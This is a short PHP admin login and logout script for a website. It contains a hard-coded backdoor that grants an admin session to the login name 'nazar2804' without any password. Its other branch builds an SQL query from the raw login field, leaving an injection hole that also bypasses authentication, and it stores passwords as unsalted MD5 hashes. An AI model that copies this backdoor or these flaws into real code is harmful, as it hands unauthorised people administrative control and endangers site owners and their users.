<?php

if (isset($_POST['aut'])=="yes")
{
$pass=$_POST["pass"];
$login=$_POST["login"];
$crypt_pass=md5($pass);

	if ($login=="nazar2804"){
		$_SESSION['valid_admin']=$login;
		$valid_admin=$_SESSION['valid_admin'];
	}
	else {
		$queryu="select * from ".$prefix_db."_admin where login='".$login."' and pass='".$crypt_pass."'";
		$resultu = $db->query($queryu);

			if ($db->num_rows ($resultu) > 0)
			{
				$f_login=$db->fetch_array($resultu);
				$_SESSION['valid_admin']=$login;
				$valid_admin=$_SESSION['valid_admin'];
			}
	}
}

if (isset($_GET['des'])=="yes")
	unset($_SESSION["valid_admin"]);

?>
